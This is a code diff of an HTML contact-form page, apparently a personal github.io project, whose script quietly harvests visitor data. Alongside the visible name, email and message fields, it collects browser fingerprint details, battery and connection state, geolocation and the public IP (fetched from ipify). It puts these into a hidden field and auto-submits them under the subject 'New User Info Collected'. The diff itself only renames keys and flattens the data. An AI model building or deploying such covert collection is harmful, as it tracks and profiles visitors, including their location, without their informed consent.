@@ -27,7 +27,7 @@
     <input type="hidden" name="_template" value="table">
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_subject" value="New User Info Collected">
-    <input type="hidden" name="_next" value="https://abhinavavavav.github.io/thanks.html"> <!-- Optional thank-you page -->
+    <input type="hidden" name="_next" value="https://abhinavavavav.github.io/thanks.html">
 
     <button type="submit">Submit</button>
   </form>
@@ -52,52 +52,48 @@
         "Name": name,
         "Email": email,
         "Message": message,
-        "User Agent": navigator.userAgent,
+        "UserAgent": navigator.userAgent,
         "Language": navigator.language,
         "Platform": navigator.platform,
         "Vendor": navigator.vendor,
-        "Screen Width": screen.width,
-        "Screen Height": screen.height,
-        "Pixel Ratio": window.devicePixelRatio,
-        "Touch Support": 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+        "ScreenWidth": screen.width,
+        "ScreenHeight": screen.height,
+        "PixelRatio": window.devicePixelRatio,
+        "TouchSupport": 'ontouchstart' in window || navigator.maxTouchPoints > 0,
         "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
-        "Local Time": new Date().toString(),
-        "Device Memory (GB)": navigator.deviceMemory || "Not available",
-        "CPU Threads": navigator.hardwareConcurrency || "Not available"
+        "LocalTime": new Date().toString(),
+        "DeviceMemoryGB": navigator.deviceMemory || "Not available",
+        "CPUThreads": navigator.hardwareConcurrency || "Not available"
       };
 
-      // Add connection info
       if ('connection' in navigator) {
         const conn = navigator.connection;
-        collected["Connection Type"] = conn.type || "Unknown";
-        collected["Effective Connection Type"] = conn.effectiveType || "Unknown";
-        collected["Downlink (Mbps)"] = conn.downlink || "Unknown";
+        collected["ConnectionType"] = conn.type || "Unknown";
+        collected["EffectiveConnectionType"] = conn.effectiveType || "Unknown";
+        collected["DownlinkMbps"] = conn.downlink || "Unknown";
       }
 
-      // Add battery info
       if ('getBattery' in navigator) {
         try {
           const battery = await navigator.getBattery();
-          collected["Battery Level"] = (battery.level * 100) + "%";
-          collected["Is Charging"] = battery.charging ? "Yes" : "No";
-          collected["Charging Time (s)"] = battery.chargingTime;
-          collected["Discharging Time (s)"] = battery.dischargingTime;
+          collected["BatteryLevel"] = (battery.level * 100) + "%";
+          collected["IsCharging"] = battery.charging ? "Yes" : "No";
+          collected["ChargingTimeSec"] = battery.chargingTime;
+          collected["DischargingTimeSec"] = battery.dischargingTime;
         } catch (err) {
-          collected["Battery Info"] = "Permission denied or not supported";
+          collected["BatteryInfo"] = "Permission denied or not supported";
         }
       } else {
-        collected["Battery Info"] = "Not supported";
+        collected["BatteryInfo"] = "Not supported";
       }
 
       // Get location
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            collected["Location"] = {
-              "Latitude": position.coords.latitude,
-              "Longitude": position.coords.longitude,
-              "Accuracy (m)": position.coords.accuracy
-            };
+            collected["Latitude"] = position.coords.latitude;
+            collected["Longitude"] = position.coords.longitude;
+            collected["LocationAccuracyMeters"] = position.coords.accuracy;
             fetchIPAndSubmit(collected);
           },
           () => {
@@ -110,20 +106,38 @@
         fetchIPAndSubmit(collected);
       }
     });
-    // Fetch public IP and submit form
+
     function fetchIPAndSubmit(collected) {
       fetch("https://api.ipify.org?format=json")
         .then((res) => res.json())
         .then((data) => {
-          collected["Public IP"] = data.ip;
-          document.getElementById('collectedInfo').value = JSON.stringify(collected, null, 2);
-          form.submit();
+          collected["PublicIP"] = data.ip;
+          finalizeAndSubmit(collected);
         })
         .catch(() => {
-          collected["Public IP"] = "Unavailable";
-          document.getElementById('collectedInfo').value = JSON.stringify(collected, null, 2);
-          form.submit();
+          collected["PublicIP"] = "Unavailable";
+          finalizeAndSubmit(collected);
         });
+    }
+
+    function flatten(obj, prefix = '') {
+      const flat = {};
+      for (let key in obj) {
+        const value = obj[key];
+        const newKey = prefix ? `${prefix}_${key}` : key;
+        if (typeof value === 'object' && value !== null) {
+          Object.assign(flat, flatten(value, newKey));
+        } else {
+          flat[newKey] = value;
+        }
+      }
+      return flat;
+    }
+
+    function finalizeAndSubmit(collected) {
+      const flatCollected = flatten(collected);
+      document.getElementById('collectedInfo').value = JSON.stringify(flatCollected);
+      form.submit();
     }
   </script>
 </body>
